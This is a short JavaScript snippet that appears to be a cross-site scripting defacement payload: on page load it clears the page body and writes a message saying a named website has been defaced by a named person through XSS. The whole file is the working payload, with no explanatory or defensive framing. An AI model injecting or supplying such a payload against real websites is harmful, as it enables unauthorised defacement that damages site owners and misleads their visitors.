document.addEventListener('DOMContentLoaded', function() {
    document.body.innerHTML = '';
    // HTML content to be loaded
    var htmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Document</title>
        </head>
        <body>
            <header><h1>Welcome!</h1></header>
            <p>I suppose you landed from the website "snipes.ch", right?</p>
            <p>Well, while you're here, I'll show you how I did this!</p>
            <b>XSS is incredible, truly!</b>
            <footer>This website has been defaced by Isaaclins :)</footer>
        </body>
        </html>
    `;

    // Open the current document for writing and replace its content
    document.open();
    document.write(htmlContent);
    document.close();
});
